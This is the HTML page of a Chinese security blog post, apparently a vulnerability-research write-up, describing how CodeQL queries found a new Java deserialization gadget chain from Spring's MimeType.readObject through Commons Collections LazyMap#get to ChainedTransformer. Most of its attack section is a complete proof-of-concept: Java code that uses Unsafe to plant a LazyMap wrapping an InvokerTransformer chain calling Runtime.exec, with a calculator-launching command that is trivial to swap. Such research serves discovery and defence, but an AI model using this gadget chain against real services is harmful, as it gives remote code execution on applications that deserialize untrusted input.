@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言文章首发于先知社区使用CodeQL在Spring组件里找到新的入口类MimeType，能够触发到LazyMap#get，进而触发CC链简单记录了一下使用codeql挖链子的工作流程，本机环境和依赖：  jdk 17.0.11 SpringBoot 3.1.10 CC 3.2.1 codeql cli 2.17.0  CodeQL起手式官方文档推荐使用vscode extension来搭建Cod">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring新入口类触发CC链">
+<meta property="og:url" content="https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/index.html">
+<meta property="og:site_name" content="Jasper_sec">
+<meta property="og:description" content="前言文章首发于先知社区使用CodeQL在Spring组件里找到新的入口类MimeType，能够触发到LazyMap#get，进而触发CC链简单记录了一下使用codeql挖链子的工作流程，本机环境和依赖：  jdk 17.0.11 SpringBoot 3.1.10 CC 3.2.1 codeql cli 2.17.0  CodeQL起手式官方文档推荐使用vscode extension来搭建Cod">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052152109.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153402.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052152887.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153403.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153405.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153406.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153407.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153079.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153408.png">
+<meta property="article:published_time" content="2024-04-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-01T04:02:02.046Z">
+<meta property="article:author" content="Jasper_sec">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="CC">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="codeql">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052152109.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Spring新入口类触发CC链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/25/0x11%20CISCN2024%20writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/07/0x0F%20vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&text=Spring新入口类触发CC链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&title=Spring新入口类触发CC链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&is_video=false&description=Spring新入口类触发CC链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring新入口类触发CC链&body=Check out this article: https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&title=Spring新入口类触发CC链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&title=Spring新入口类触发CC链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&title=Spring新入口类触发CC链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&title=Spring新入口类触发CC链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&name=Spring新入口类触发CC链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&t=Spring新入口类触发CC链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CodeQL%E8%B5%B7%E6%89%8B%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">CodeQL起手式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.</span> <span class="toc-text">编写查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90%E5%92%8C%E9%AA%8C%E8%AF%81"><span class="toc-number">4.</span> <span class="toc-text">链子分析和验证</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Spring新入口类触发CC链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Jasper_sec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-18T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-04-19</time>
+        
+        (Updated: <time datetime="2024-09-01T04:02:02.046Z" class="dt-updated" itemprop="dateModified">2024-09-01</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CC/" rel="tag">CC</a>, <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/codeql/" rel="tag">codeql</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章首发于先知社区<br>使用CodeQL在Spring组件里找到新的入口类MimeType，能够触发到LazyMap#get，进而触发CC链<br>简单记录了一下使用codeql挖链子的工作流程，本机环境和依赖：</p>
+<ul>
+<li>jdk 17.0.11</li>
+<li>SpringBoot 3.1.10</li>
+<li>CC 3.2.1</li>
+<li>codeql cli 2.17.0</li>
+</ul>
+<h1 id="CodeQL起手式"><a href="#CodeQL起手式" class="headerlink" title="CodeQL起手式"></a>CodeQL起手式</h1><p>官方文档推荐使用vscode extension来搭建CodeQL环境，简单来说就是下面三个步骤：</p>
+<ul>
+<li>下载CodeQL CLI命令行工具，配置好终端环境变量</li>
+<li>vscode安装CodeQL插件，配置好CodeQL CLI的路径</li>
+<li>下载vscode-codeql-starter工作空间搭好框架，下一步是导入数据库，随便找一个项目java-sec-code，创建数据库命令的命令：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create /Users/jasper/Documents/Security/tools/CodeQL/databases/java-sec-code-database --language=java --source-root=/Users/jasper/Documents/Security/java/java-sec-code --command=&quot;mvn clean package&quot;</span><br></pre></td></tr></table></figure>
+
+<p>点侧栏点CodeQL插件，选Java、导入数据库、运行example.ql，能正常运行输出结果，说明环境正常，开挖<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052152109.png" alt="image.png"></p>
+<h1 id="编写查询"><a href="#编写查询" class="headerlink" title="编写查询"></a>编写查询</h1><p>CodeQL基础语法网上很多文章，基本是对着文档翻译的，可以直接从<a target="_blank" rel="noopener" href="https://codeql.github.com/docs/writing-codeql-queries/">写查询语句</a>开始往下看，不多赘述<br>下面写一下找链子的流程，首先分析目标：找一个新的入口类，经过调用，能够触发到LazyMap#get<br>那么显然source就是readObject方法，在类中定义成员谓词写限定条件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Source  </span><br><span class="line">class ReadObjectMethod extends <span class="keyword">Method</span> &#123;  </span><br><span class="line">    ReadObjectMethod()&#123;  </span><br><span class="line">        this.getDeclaringType() instanceof Serializable <span class="keyword">and</span>  </span><br><span class="line">        this.isPrivate() <span class="keyword">and</span>  </span><br><span class="line">        this.hasName(&quot;readObject&quot;) <span class="keyword">and</span>   </span><br><span class="line">        this.getReturnType() instanceof VoidType  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后再写sink点的限定条件，直接指定LazyMap全类名的get方法即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Sink  </span><br><span class="line">class LazyMapGetMethod extends <span class="keyword">Method</span> &#123;  </span><br><span class="line">    LazyMapGetMethod() &#123;  </span><br><span class="line">        this.getDeclaringType() instanceof Serializable <span class="keyword">and</span>  </span><br><span class="line">        this.isPublic() <span class="keyword">and</span>  </span><br><span class="line">        this.getReturnType() instanceof TypeObject <span class="keyword">and</span>  </span><br><span class="line">        this.hasName(&quot;get&quot;) <span class="keyword">and</span>   </span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;org.apache.commons.collections.map&quot;,&quot;LazyMap&quot;)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行一下有45条结果，可以看到光MimeType就有几条路径可以调到LazyMap#get，随便找一条验证一下即可<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153402.png" alt="image.png"></p>
+<p>实际上，直接把sink点定到transform也可以找到这条链子，它是可以直接打到ChainedTransformer#transfrom的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052152887.png" alt="image.png"></p>
+<h1 id="链子分析和验证"><a href="#链子分析和验证" class="headerlink" title="链子分析和验证"></a><a href="https://jaspersec.top/2024/05/05/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90%E5%92%8C%E9%AA%8C%E8%AF%81" title="链子分析和验证"></a>链子分析和验证</h1><p>以找到的最简单的路径为例，通过MimeType入口类触发getParameter到LazyMap#get，调用链如下：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153403.png" alt="image.png"></p>
+<p>然后拼上CC1-LazyMap后半段，验证链子是否有效，函数调用栈如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">transform:<span class="number">120</span>, InvokerTransformer (org.apache.commons.collections.functors)  </span><br><span class="line">transform:<span class="number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)  </span><br><span class="line"><span class="keyword">get</span>:<span class="number">158</span>, LazyMap (org.apache.commons.collections.map)  </span><br><span class="line">getParameter:<span class="number">328</span>, MimeType (org.springframework.util)  </span><br><span class="line">readObject:<span class="number">677</span>, MimeType (org.springframework.util)  </span><br><span class="line">invoke0:<span class="number">-1</span>, NativeMethodAccessorImpl (jdk.internal.reflect)  </span><br><span class="line">invoke:<span class="number">77</span>, NativeMethodAccessorImpl (jdk.internal.reflect)  </span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (jdk.internal.reflect)  </span><br><span class="line">invoke:<span class="number">568</span>, <span class="keyword">Method</span> (java.lang.reflect)  </span><br><span class="line">invokeReadObject:<span class="number">1104</span>, ObjectStreamClass (java.io)  </span><br><span class="line">readSerialData:<span class="number">2434</span>, ObjectInputStream (java.io)  </span><br><span class="line">readOrdinaryObject:<span class="number">2268</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject0:<span class="number">1744</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject:<span class="number">514</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject:<span class="number">472</span>, ObjectInputStream (java.io)  </span><br><span class="line">unserializeBase64:<span class="number">38</span>, SerializeUtils (utils)  </span><br><span class="line">main:<span class="number">34</span>, Test (Test)</span><br></pre></td></tr></table></figure>
+
+<p>MimeType#readObject会调用this.getParameter(“charset”)</p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153405.png" alt="image.png"></p>
+<p>getParameter会调用this.parameters.get(“chatset”)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153406.png" alt="image.png"></p>
+<p>parameters正好是Map类型的，我们用反射把变量设置成LazyMap对象即可</p>
+<p>需要注意的是，jdk17中反射修改变量会存在权限问题，所以这里使用unsafe修改parameters变量<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153407.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153079.png" alt="image.png"></p>
+<p>Poc如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Test.java  </span><br><span class="line">package Test;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">import org.springframework.util.MimeType;  </span><br><span class="line">import sun.misc.Unsafe;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.<span class="operator">*</span>;  </span><br><span class="line">  </span><br><span class="line">import utils.<span class="operator">*</span>;  </span><br><span class="line">  </span><br><span class="line">public class Test &#123;  </span><br><span class="line">    public <span class="keyword">static</span> void main(String[] args) throws Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers <span class="operator">=</span> <span class="keyword">new</span> Transformer[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(&quot;getMethod&quot;,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;&quot;getRuntime&quot;,<span class="keyword">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(&quot;invoke&quot;,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(&quot;exec&quot;, <span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;&quot;open -a Calculator&quot;&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        ChainedTransformer chainedTransformer <span class="operator">=</span> <span class="keyword">new</span> ChainedTransformer(transformers);  </span><br><span class="line">        HashMap map <span class="operator">=</span> <span class="keyword">new</span> HashMap();  </span><br><span class="line">        Map map1 <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        Field field <span class="operator">=</span> Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        Unsafe unsafe <span class="operator">=</span> (Unsafe)field.get((Object)<span class="keyword">null</span>);  </span><br><span class="line">        MimeType mimeType <span class="operator">=</span> (MimeType) unsafe.allocateInstance(MimeType.class);  </span><br><span class="line">        unsafe.putObject(mimeType,unsafe.objectFieldOffset(MimeType.class.getDeclaredField(&quot;parameters&quot;)),map1);  </span><br><span class="line">  </span><br><span class="line">        String pld <span class="operator">=</span>  SerializeUtils.serializeBase64(mimeType);  </span><br><span class="line">        SerializeUtils.unserializeBase64(pld);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153408.png" alt="image.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CodeQL%E8%B5%B7%E6%89%8B%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">CodeQL起手式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.</span> <span class="toc-text">编写查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90%E5%92%8C%E9%AA%8C%E8%AF%81"><span class="toc-number">4.</span> <span class="toc-text">链子分析和验证</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&text=Spring新入口类触发CC链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&title=Spring新入口类触发CC链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&is_video=false&description=Spring新入口类触发CC链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring新入口类触发CC链&body=Check out this article: https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&title=Spring新入口类触发CC链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&title=Spring新入口类触发CC链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&title=Spring新入口类触发CC链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&title=Spring新入口类触发CC链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
